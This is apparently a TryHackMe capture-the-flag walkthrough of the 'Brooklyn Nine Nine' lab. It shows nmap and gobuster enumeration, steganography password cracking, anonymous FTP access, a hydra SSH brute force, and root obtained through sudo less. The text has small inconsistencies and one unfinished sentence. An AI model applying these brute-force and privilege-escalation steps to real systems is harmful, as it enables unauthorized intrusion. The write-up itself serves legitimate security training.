# [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

## Attack Narative

### Remote System Discovery 

In an attempt to identify the potential attack surface, we ran a network scanner on the serveer. 

```bash
clobee@kali:~/tmp/brooklyn99$ nmap -sV -sC -A -oN nmap 10.10.65.228

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-02 21:53 GMT
Nmap scan report for 10.10.65.228
Host is up (0.027s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.21.99
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds
```

The server was found to be running: 

	- A FTP without an anonymous access
	- An SSH service
	- A website 

With the different services identified, we then verified each services.

#### Website 

```bash
clobee@kali:~$ curl 10.10.65.228

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("brooklyn99.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
</head>
<body>

<div class="bg"></div>

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>
clobee@kali:~$
```
The source code of the web site on port 80 revealled an important hint:

`<!-- Have you ever heard of steganography? -->`

##### Image analysis

We retrieved the main image from the web site.

```bash
clobee@kali:~$ wget http://10.10.65.228/brooklyn99.jpg
--2021-01-02 21:58:53--  http://10.10.65.228/brooklyn99.jpg
Connecting to 10.10.65.228:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69685 (68K) [image/jpeg]
Saving to: ‘brooklyn99.jpg’

brooklyn99.jpg                100%[===============================================>]  68.05K  --.-KB/s    in 0.06s   

2021-01-02 21:58:53 (1.11 MB/s) - ‘brooklyn99.jpg’ saved [69685/69685]
```

```bash
clobee@kali:~/tmp/brooklyn99$ steghide info brooklyn99.jpg 
"brooklyn99.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
clobee@kali:~/tmp/brooklyn99$ stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt 
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2021 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20523 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```

The analyse of the image revealed a password for the user `holt`

```bash
clobee@kali:~/tmp/brooklyn99$ batcat brooklyn99.jpg.out 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: brooklyn99.jpg.out
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Holts Password:
   2   │ fluffydog12@ninenine
   3   │ 
   4   │ Enjoy!!
───────┴────────────────────────────
```

### SSH access: user holt

```bash
clobee@kali:~/tmp/brooklyn99$ sshpass -p 'fluffydog12@ninenine' ssh holt@10.10.65.228
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
```

#### Directory scan

We conducted a quick directory scan of the system looking for common directories and files

```bash
clobee@kali:~/tmp/brooklyn99$ gobuster dir -u http://10.10.65.228 -w /usr/share/wordlists/dirb/common.txt 

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.65.228
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/02 22:32:10 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2021/01/02 22:32:22 Finished
===============================================================
clobee@kali:~/tmp/brooklyn99$ 
```

Unfortunately the scan results didn't reveal anything usefull for our mission.

#### FTP enumeration

The initial enumeration done with the tool nmap revealed an interesting file on the FTP server.

```bash
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
```

Login to the FTP using the guest ftp account (and no password) we were able to retrieve the interesting file.

```bash
clobee@kali:~/tmp/brooklyn99$ ftp 10.10.65.228

Connected to 10.10.65.228.
220 (vsFTPd 3.0.3)
Name (10.10.65.228:clobee): ftp  
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -ail
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.

ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.13 secs (0.8721 kB/s)
ftp> quit
221 Goodbye.
clobee@kali:~/tmp/brooklyn99$ 
```

```bash
clobee@kali:~/tmp/brooklyn99$ batcat note_to_jake.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: note_to_jake.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ From Amy,
   2   │ 
   3   │ Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
   4   │ 
   5   │ 
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

##### SSH Brute force

Thanks to the note we discovered from the FTP we knew that we had a potential vulnerable user.
A brute force exercice on the SSH service with the user `Jake` revealed his password

```bash
clobee@kali:~/tmp/brooklyn99$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.65.228

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-02 22:34:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344370 login tries (l:1/p:14344370), ~896524 tries per task
[DATA] attacking ssh://10.10.65.228:22/
[22][ssh] host: 10.10.65.228   login: jake   password: 987654321
```

##### SSH access: user jake

The password for user `Jake` that we retrieved from the brute force was correctly working

```bash
clobee@kali:~/tmp/brooklyn99$ sshpass -p '987654321' ssh jake@10.10.65.228
Last login: Tue May 26 08:56:58 2020
```

Using the limited access to the system, we conducted an analysis of the exploited system. 
This resulted in the discovery of a private XXXX

### Interactive shell to account

The previous steps of enumeration revealled 2 SSH access.
Both user account revealled to be able to use sudo on commands with well-known vulnerabilities.
We leveraged one of this vunerability to gain root access.

#### User flag

```bash
holt@brookly_nine_nine:~$ sudo -l 
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

```bash
holt@brookly_nine_nine:~$ cat /home/holt/user.txt 
```
#### Root flag

```bash
jake@brookly_nine_nine:~$ sudo -l 
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ sudo /usr/bin/less /etc/profile
root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)
root@brookly_nine_nine:~# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: xxxx

Enjoy!!
```
